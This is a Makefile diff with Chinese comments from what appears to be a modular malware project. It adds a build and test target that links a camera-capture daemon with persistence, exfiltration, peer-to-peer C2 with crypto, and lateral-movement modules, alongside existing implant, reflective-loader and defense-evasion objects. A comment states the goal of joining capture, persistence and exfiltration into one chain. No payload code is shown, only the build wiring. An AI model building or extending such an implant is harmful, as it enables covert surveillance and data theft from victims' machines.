@@ -19,7 +19,12 @@ CXX      ?= g++
 # defend_win.c 复用 17_loader 的 PE 导出解析与 19_defense 的桩字节，
 # 不重复实现这两层，因此构建时需要带上它们的头文件与对应源文件。
 DEP_I    := -I../17_loader/include -I../19_defense/include
-CFLAGS   ?= -std=c99 -O2 -Wall -Wextra -Wpedantic -Iinclude $(DEP_I)
+# cam_daemon.c 需要驻留（09）、回传（21_exfil）、信元（14_p2p）、
+# C2 帧（02_c2）、横向（08_lateral）五处头文件。不重复实现任何一层，
+# 只引用它们的接口。
+DAEMON_I := -I../09_persistence/include -I../21_exfil/include \
+            -I../14_p2p/include -I../02_c2/include -I../08_lateral/include
+CFLAGS   ?= -std=c99 -O2 -Wall -Wextra -Wpedantic -Iinclude $(DEP_I) $(DAEMON_I)
 CXXFLAGS ?= -std=c++17 -O2 -Wall -Wextra -Iinclude
 LDLIBS   ?= -lm
 
@@ -45,11 +50,47 @@ PORT_SRCS := src/cam_jpeg.c src/cam_mock.c src/cam_factory.c \
             src/reflect_run.c
 PORT_OBJS := $(PORT_SRCS:src/%.c=$(BUILD)/%.o)
 
+# cam_daemon.o **不**进 PORT_OBJS。
+#
+# 它依赖驻留（09）/ 回传（21_exfil）/ 信元（14_p2p）三个上游模块。
+# PORT_OBJS 会被通用规则链进**每一个**测试二进制，把 cam_daemon.o 放进去
+# 会让其余测试全部 undefined reference —— 一次就把整模块构建打碎。
+# 故单独成变量，只链进需要它的目标。
+DAEMON_OBJ := $(BUILD)/cam_daemon.o
+
+# cam_daemon 的跨模块依赖：驻留（09）+ 回传（21_exfil）+ 信元（14_p2p）。
+#
+# 不用 $(shell $(MAKE) -C ...) 在读取阶段触发：那会让本 Makefile 的
+# **每一次**调用（包括 make -n、make clean、构建无关目标）都付出上游
+# 全量构建的代价，实测让单次构建从秒级变成数十秒。
+# 改为显式 phony 目标，只作为 test_cam_daemon 的 order-only 前置。
+.PHONY: upstream-deps
+upstream-deps:
+	@missing=0; \
+	for f in $(DAEMON_DEPS); do [ -f "$$f" ] || missing=1; done; \
+	if [ $$missing -eq 0 ]; then exit 0; fi; \
+	$(MAKE) -C ../09_persistence --no-print-directory >/dev/null; \
+	$(MAKE) -C ../08_lateral    --no-print-directory >/dev/null; \
+	$(MAKE) -C ../14_p2p        --no-print-directory >/dev/null; \
+	$(MAKE) -C ../21_exfil      --no-print-directory >/dev/null
+
+PERSIST_OBJ := ../09_persistence/build/persist.o
+EXFIL_OBJS  := ../21_exfil/build/exfil.o ../21_exfil/build/exfil_link.o
+P2PLIB      := ../14_p2p/build/libp2p.a
+C2OBJS      := ../14_p2p/build/c2.o ../14_p2p/build/c2_frame.o \
+               ../14_p2p/build/crypto_gcm.o ../14_p2p/build/crypto_hash.o \
+               ../14_p2p/build/crypto_x25519.o
+LATLIB      := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
+
+# 上游产物不参与本 Makefile 的增量判断（它们由上游自己的 make 管），
+# 但必须声明为 order-only 依赖，否则首次构建时链接器可能拿到空/旧文件。
+DAEMON_DEPS := $(PERSIST_OBJ) $(EXFIL_OBJS) $(P2PLIB) $(C2OBJS) $(LATLIB)
+
 DEP_OBJS  := $(BUILD)/dep/loader_pe.o $(BUILD)/dep/loader_reflect.o \
              $(BUILD)/dep/defense_evade.o
 
 TESTS     := test_pipeline test_linux_extra test_implant test_defend_win \
-             test_reflect_run
+             test_reflect_run test_cam_daemon
 TEST_BINS := $(TESTS:%=$(BUILD)/%)
 
 # winshim 下的测试（test_mf_logic / test_persist_win / test_implant_main /
@@ -89,6 +130,16 @@ $(BUILD)/synth_pe.o: tests/synth_pe.c tests/synth_pe.h | dirs
 
 $(BUILD)/test_%: tests/test_%.c $(PORT_OBJS) $(DEP_OBJS) $(BUILD)/synth_pe.o | dirs
 	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DEP_OBJS) $(BUILD)/synth_pe.o -o $@ $(LDLIBS)
+
+# cam_daemon 测试：显式规则，覆盖上面的通用模式规则。
+# 额外链入驻留 / 回传 / 信元三个上游模块，把「采集—驻留—回传」真正串起来。
+$(BUILD)/test_cam_daemon: tests/test_cam_daemon.c $(PORT_OBJS) $(DAEMON_OBJ) \
+                          $(DEP_OBJS) $(BUILD)/synth_pe.o $(DAEMON_DEPS) \
+                          | dirs upstream-deps
+	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
+	      $(BUILD)/synth_pe.o \
+	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
+	      -o $@ $(LDLIBS)
 
 test: $(TEST_BINS)
 	@fail=0; \
